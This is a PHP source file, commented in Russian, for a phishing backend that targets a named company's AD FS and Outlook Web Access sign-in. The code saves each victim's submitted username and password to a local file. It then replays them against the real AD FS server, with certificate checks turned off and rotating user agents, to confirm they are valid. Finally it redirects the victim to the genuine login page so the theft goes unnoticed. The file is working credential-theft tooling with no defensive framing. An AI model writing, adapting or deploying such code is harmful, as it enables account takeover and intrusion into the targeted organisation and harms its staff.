<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['UserName'];
    $password = $_POST['Password'];
    $authMethod = 'FormsAuthentication';
    $cred_file ='credential.txt';
	$cred_data = "$username : $password\n\r";
	file_put_contents($cred_file, $cred_data, FILE_APPEND);
    // CHANGE THIS
    //$url = 'https://adfs.mtsretail.ru/adfs/ls?version=1.0&action=signin&realm=urn%3AAppProxy%3Acom&appRealm=1f37fa0b-18cd-e811-90ed-0050560b09eb&returnUrl=https%3A%2F%2Fe-mail.mtsretail.ru%2Fowa&client-request-id=3ACFC098-C0AE-0002-B9FD-8741AEC0D901';
    //$url2 = "adfs.mtsretail.ru";
    //$url3 = "e-mail.mtsretail.ru";
    
    // AD FS URL
    $url = "https://adfs.mtsretail.ru/adfs/ls?version=1.0&action=signin&realm=urn%3AAppProxy%3Acom&appRealm=1f37fa0b-18cd-e811-90ed-0050560b09eb&returnUrl=https%3A%2F%2Fe-mail.mtsretail.ru%2Fowa&client-request-id=3ACFC098-C0AE-0002-B9FD-8741AEC0D901";
    
    // HOSTNAME
    $url2 = "adfs.mtsretail.ru";

    // Exchange (Optional. If not set to equal $url2)
    $url3 = "e-mail.mtsretail.ru";

    // Phishing URL. На ней обрабатывать ошибки
    $url4 = 'http://'.$_SERVER['HTTP_HOST'];
    
    ///////////////////////////////////
    
    $user_agents = [
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1 Safari/534.52.7',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/11.0 Safari/537.36',
    ];
    
    $random_user_agent = $user_agents[array_rand($user_agents)];
    
    

    // TO RECEIVE MSISSamlRequest
    $data = 'SignInIdpSite=SignInIdpSite&SignInSubmit=%D0%92%D1%85%D0%BE%D0%B4&SingleSignOut=SingleSignOut';

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);         // получение заголовков
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);    // автоматическое следование редиректам 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);    // отключение проверки SSL сертификата
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    // отключение проверки SSL сертификата

// Заголовки
    $headers = [
    "Host: $url2",
    "Content-Length: " . strlen($data),
    "Cache-Control: max-age=0",
    "Sec-Ch-Ua: ", 
    "Sec-Ch-Ua-Mobile: ?0",
    "Sec-Ch-Ua-Platform: \"\"",
    "Upgrade-Insecure-Requests: 1",
    "Origin: https://$url2",
    "Content-Type: application/x-www-form-urlencoded",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site: same-origin",
    "Sec-Fetch-Mode: navigate",
    "Sec-Fetch-User: ?1",
    "Sec-Fetch-Dest: document",
    "Referer: $url",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection: close"];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $response = curl_exec($ch);

    $startPosition = strpos($response, "Set-Cookie: ");
    if ($startPosition !== false) {
        $cookieString = substr($response, $startPosition + strlen("Set-Cookie: "));
    
        $endPosition = strpos($cookieString, "\r\n");
    
        if ($endPosition !== false) {
            $cookieValue = substr($cookieString, 0, $endPosition);
        }

    }

    if ($cookieValue == null){
        $cokieValue="timedatastamp:true"; // redirect to legit website
    }

    // SEND PHISHING DATA
    $options2 = [
        "ssl"=>array(
            "verify_peer"=>false,
            "verify_peer_name"=>false,
        ),
        'http' => [
            'header'  => "Host: $url2\r\n" .
                         "Cache-Control: max-age=0\r\n" .
                         "Sec-Ch-Ua: \r\n" .
                         "Sec-Ch-Ua-Mobile: ?0\r\n" .
                         "Sec-Ch-Ua-Platform: \"\"\r\n" .
                         "Upgrade-Insecure-Requests: 1\r\n" .
                         "Origin: https://$url2\r\n" .
                         "Cookie: $cookieValue".
                         "Content-Type: application/x-www-form-urlencoded\r\n" .
                         "User-Agent: $random_user_agent\r\n" .
                         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n" .
                         "Sec-Fetch-Site: same-origin\r\n" .
                         "Sec-Fetch-Mode: navigate\r\n" .
                         "Sec-Fetch-User: ?1\r\n" .
                         "Sec-Fetch-Dest: document\r\n" .
                         "Referer: https://$url2/adfs/ls?version=1.0&action=signin&realm=urn%3AAppProxy%3Acom&appRealm=1f37fa0b-18cd-e811-90ed-0050560b09eb&returnUrl=https%3A%2F%2F$url3%2Fowa&client-request-id=3ACFC098-C0AE-0002-B9FD-8741AEC0D901\r\n" .
                         "Accept-Encoding: gzip, deflate\r\n" .
                         "Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7\r\n" .
                         "Connection: close\r\n",
            'method'  => 'POST',
            'content' => http_build_query([
                'UserName' => $username,
                'Password' => $password,
                'AuthMethod' => $authMethod
            ]),
        ],
    ];

    $context2 = stream_context_create($options2);
    try {
    sleep(0.5);
    $result = file_get_contents($url, false, $context2);
    }catch (Exception $e) {
        header("Location: $url4?error=IE32231"); // Редирект на страницу где написано, что что-то пошло не так
        exit;
    }

    if ($result === false) {
        header("Location: $url4?error=IE32231"); // Редирект на страницу где написано, что что-то пошло не так
        exit;
    }

    if (strpos($result, 'Неверный идентификатор пользователя или пароль') !== false) {
        header("Location: $url4?error=IX52312"); // Редирект на страницу где написано, что креды неверные
        exit;
    }
    $checked = "\t[+]VALID\n\r";
    file_put_contents($cred_file, $checked, FILE_APPEND);
    header("Location: $url"); //Редирект на легитимную панельку входа
    exit;
}
